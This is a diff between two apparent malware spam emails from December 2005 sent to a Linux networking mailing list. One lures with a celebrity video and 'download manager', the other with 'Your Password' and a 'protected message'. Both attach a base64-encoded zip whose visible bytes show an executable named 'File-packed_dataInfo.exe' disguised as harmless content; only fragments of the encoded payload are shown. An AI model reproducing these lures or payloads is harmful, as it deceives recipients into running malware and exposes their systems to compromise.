@@ -1,30 +1,29 @@
-From: info@4minds.co.th
-Subject: Paris_Hilton_&_Nicole_Richie
-Date: Sun, 25 Dec 2005 08:36:31 UTC
-Message-ID: <3c7fcc68ae.2e190cda@4minds.co.th>
+From: postman@dewinter.com
+Subject: Your Password
+Date: Sun, 25 Dec 2005 08:46:52 UTC
+Message-ID: <507aa4.f4ef52dadff0@dewinter.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=964421867a5a06"
+Content-Type: multipart/mixed; boundary="=ecebca8a57fea3b5"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: netdev@oss.sgi.com
+To: smntp@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=964421867a5a06
+--=ecebca8a57fea3b5
 
-The Simple Life:
+Protected message is attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---=964421867a5a06
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.dewinter.com
+***** Email: postman@dewinter.com
+--=ecebca8a57fea3b5
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=964421867a5a06--
+--=ecebca8a57fea3b5--
